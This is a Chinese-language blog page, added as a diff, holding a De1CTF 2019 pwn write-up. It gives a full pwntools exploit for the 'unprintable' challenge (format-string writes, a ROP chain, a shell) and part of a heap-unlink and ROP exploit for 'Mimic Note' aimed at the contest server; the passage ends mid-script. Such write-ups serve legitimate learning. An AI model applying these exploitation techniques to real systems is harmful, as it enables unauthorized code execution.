@@ -1,0 +1,1313 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css"/>
+
+
+
+
+
+
+
+
+
+  <meta name="google-site-verification" content="JaodW7D6jSkocuG_zIdKbBnDjM2skzLPZwv5CJMuXiM"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/avatar/avatar.jpeg?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/avatar/avatar.jpeg?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/avatar/avatar.jpeg?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/avatar/avatar.jpeg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="De1CTF的unprintable和Mimic Note。">
+<meta name="keywords" content="pwn,ctf,2019,de1ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="De1CTF 2019 pwn writeup">
+<meta property="og:url" content="https://sunichi.github.io/2019/08/08/de1ctf19-pwn/index.html">
+<meta property="og:site_name" content="Sunichi&#39;s Blog">
+<meta property="og:description" content="De1CTF的unprintable和Mimic Note。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-08T07:58:16.933Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="De1CTF 2019 pwn writeup">
+<meta name="twitter:description" content="De1CTF的unprintable和Mimic Note。">
+
+
+
+
+
+
+  <link rel="canonical" href="https://sunichi.github.io/2019/08/08/de1ctf19-pwn/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>De1CTF 2019 pwn writeup | Sunichi's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sunichi's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">sunichi@DUBHE | learn linux & pwn</h1>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sunichi.github.io/2019/08/08/de1ctf19-pwn/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sunichi"/>
+      <meta itemprop="description" content=""/>
+      <meta itemprop="image" content="/avatar/avatar.jpeg"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sunichi's Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">De1CTF 2019 pwn writeup
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-08 15:30:00 / 修改时间：15:58:16" itemprop="dateCreated datePublished" datetime="2019-08-08T15:30:00+08:00">2019-08-08</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>De1CTF的unprintable和Mimic Note。</p>
+<a id="more"></a>
+<h2 id="unprintable"><a href="#unprintable" class="headerlink" title="unprintable"></a>unprintable</h2><p>比赛的时候愣是没调出来，看了大佬们的做法，有一种做法和之前的某个题类似，就是劫持<code>exit()</code>执行时的控制流。在程序退出的时候，会调用<code>fini_array</code>上的函数，相关地址通过计算得到且计算过程中的一个参数在栈上有地址指向，因此可以通过格式化字符串修改该参数，使得执行<code>exit()</code>时跳回<code>main()</code>函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./unprintable'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p = process(<span class="string">'./unprintable'</span>)</span><br><span class="line">    </span><br><span class="line">        p.recvuntil(<span class="string">'This is your gift: '</span>)</span><br><span class="line">        recv = p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">        stack_addr = int(recv, <span class="number">16</span>)</span><br><span class="line">        target_addr = stack_addr - <span class="number">312</span> + <span class="number">0x18</span></span><br><span class="line">        <span class="keyword">print</span> hex(stack_addr)</span><br><span class="line">        <span class="keyword">print</span> hex(target_addr)</span><br><span class="line">        <span class="keyword">if</span> (target_addr &amp; <span class="number">0xffff</span> &gt; <span class="number">0x1000</span> <span class="keyword">or</span> (target_addr &amp; <span class="number">0xffff</span>) - (<span class="number">0x601060</span> - <span class="number">0x600dd8</span>) &lt; <span class="number">0x10</span>):</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset_stack = (<span class="number">0x7fff14d283b0</span> - <span class="number">0x7fff14d28310</span>) / <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">offset_ret   = (<span class="number">0x7fff9de105e8</span> - <span class="number">0x7fff9de105c0</span>) / <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">offset_buf = <span class="number">0x601060</span> - <span class="number">0x600dd8</span></span><br><span class="line">target_ret = target_addr &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%'</span> + str(offset_buf + <span class="number">0x17</span>) + <span class="string">'x%'</span> + str(offset_stack) + <span class="string">'$hn'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(target_ret - offset_buf - <span class="number">0x17</span>) + <span class="string">'x%'</span> + str(offset_ret) + <span class="string">'$hn'</span></span><br><span class="line">payload += p64(<span class="number">0x4007a3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(payload) - <span class="number">8</span> != <span class="number">0x17</span>:</span><br><span class="line">    payload = <span class="string">'%'</span> + str(offset_buf + <span class="number">0x16</span>) + <span class="string">'x%'</span> + str(offset_stack) + <span class="string">'$hn'</span></span><br><span class="line">    payload += <span class="string">'%'</span> + str(target_ret - offset_buf - <span class="number">0x16</span>) + <span class="string">'x%'</span> + str(offset_ret) + <span class="string">'$hn'</span></span><br><span class="line">    payload += p64(<span class="number">0x4007a3</span>)    </span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">offset_ret = (<span class="number">0x7ffc94990a40</span> - <span class="number">0x7ffc949909b8</span>) / <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">offset_rsp = (<span class="number">0x7fff5a400bc0</span> - <span class="number">0x7fff5a400b78</span>) / <span class="number">8</span> + <span class="number">6</span></span><br><span class="line">target_addr += <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> target_addr &amp; <span class="number">0xffff</span> &lt; <span class="number">0x7a3</span>:</span><br><span class="line">    payload = <span class="string">'%'</span> + str(target_addr &amp; <span class="number">0xffff</span>) + <span class="string">'x%'</span> + str(offset_rsp) + <span class="string">'$hn'</span></span><br><span class="line">    payload += <span class="string">'%'</span> + str(<span class="number">0x7a3</span> - (target_addr &amp; <span class="number">0xffff</span>)) + <span class="string">'x%'</span> + str(offset_ret) + <span class="string">'$hn'</span> + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = <span class="string">'%'</span> + str(<span class="number">0x7a3</span>) + <span class="string">'x%'</span> + str(offset_ret) + <span class="string">'$hn'</span></span><br><span class="line">    payload += <span class="string">'%'</span> + str((target_addr &amp; <span class="number">0xffff</span>) - <span class="number">0x7a3</span>) + <span class="string">'x%'</span> + str(offset_rsp) + <span class="string">'$hn'</span> + <span class="string">'\x00'</span>    </span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change pop rsp value 0x1060 / ret</span></span><br><span class="line">payload = <span class="string">'%'</span> + str(<span class="number">0x7a3</span>) + <span class="string">'x%'</span> + str(offset_ret) + <span class="string">'$hn'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(<span class="number">0x1200</span> - <span class="number">0x7a3</span>) + <span class="string">'x%41$hn'</span> + <span class="string">'\x00'</span> </span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((target_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>) &lt; <span class="number">0x7a3</span>:</span><br><span class="line">    payload = <span class="string">'%'</span> + str((target_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>) + <span class="string">'x%15$hn'</span></span><br><span class="line">    payload += <span class="string">'%'</span> + str(<span class="number">0x7a3</span> - ((target_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>)) + <span class="string">'x%23$hn'</span> + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = <span class="string">'%'</span> + str(<span class="number">0x7a3</span>) + <span class="string">'x%23$hn'</span></span><br><span class="line">    payload += <span class="string">'%'</span> + str(((target_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>) - <span class="number">0x7a3</span>) + <span class="string">'x%15$hn'</span> + <span class="string">'\x00'</span>    </span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%'</span> + str(<span class="number">0x60</span>) + <span class="string">'x%41$n'</span></span><br><span class="line">payload += <span class="string">'%'</span> + str(<span class="number">0x7a3</span> - <span class="number">0x60</span>) + <span class="string">'x%23$hn'</span> + <span class="string">'\x00'</span> </span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%'</span> + str(<span class="number">0x82d</span>) + <span class="string">'x%23$hn'</span> + <span class="string">'\x00'</span> </span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400833</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x601218</span><span class="number">-0x601060</span><span class="number">-8</span>, <span class="string">'\x00'</span>) + <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p64(<span class="number">0x40082a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">'read'</span>]) + p64(<span class="number">0x800</span>) + p64(<span class="number">0x601800</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400810</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(<span class="number">0x400833</span>) + p64(<span class="number">0x601060</span>) + p64(elf.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(<span class="number">0x40082d</span>) + p64(<span class="number">0x601800</span> - <span class="number">8</span> * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x40082a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">'read'</span>]) + p64(<span class="number">0x1</span>) + p64(<span class="number">0x601218</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400810</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">payload += p64(<span class="number">0x40082a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(elf.got[<span class="string">'read'</span>]) + p64(<span class="number">59</span>) + p64(<span class="number">0x601060</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x400810</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x40082a</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x601218</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x601210</span>) + p64(<span class="number">0x400810</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'\xac'</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'\x00'</span> * <span class="number">59</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/bin/sh 1&gt;&amp;2'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x000000000040082c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040082e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400830 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400832 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040082b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040082f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400690 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400833 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400831 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005d1 : ret</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<h2 id="Mimic-Note"><a href="#Mimic-Note" class="headerlink" title="Mimic Note"></a>Mimic Note</h2><p>要用同一个脚本同时打通两个程序并且要让其输出一致（输入不确定是否要一致，但调exp的时候调成一致了）。由于32bit和64bit程序<code>size_t</code>大小不一致，使得两边的unlink不会互相影响，所以只要编排好chunk的顺序就能在两边按次序完成<em>unlink</em>。</p>
+<p><em>unlink</em>完成后利用劫持<code>atoi()@got</code>进行ROP，这里一个较难的点就是要让两个程序同时进入ROP以免程序输出不一致。然后就是疯狂找gadget，同时利用数据的错位，使得两个程序在一次输入后同时进入了ROP。</p>
+<p>再往后就是常规的没有输出的情况下进行ROP getshell了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(p, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'size?\n'</span>, str(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'index ?\n'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(p, idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'index ?\n'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(p, idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, str(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'index ?\n'</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'content?\n'</span>, content)</span><br><span class="line">    <span class="comment">#sleep(0.5)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(count)</span>:</span></span><br><span class="line">    DEBUG = <span class="number">0</span></span><br><span class="line">    arch = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    elf32 = ELF(<span class="string">'./mimic_note_32'</span>)</span><br><span class="line">    elf64 = ELF(<span class="string">'./mimic_note_64'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#if DEBUG == 1 and arch == '64':</span></span><br><span class="line">    <span class="comment">#    p = process('./mimic_note_64')</span></span><br><span class="line">    <span class="comment">#elif DEBUG == 1 and arch == '32':</span></span><br><span class="line">    <span class="comment">#    p = process('./mimic_note_32')</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#p = process('./mimic')</span></span><br><span class="line">        <span class="comment">#p = remote('127.0.0.1', 9999)</span></span><br><span class="line">        p = process(<span class="string">'./mimic'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'45.32.120.212'</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#pass</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 64 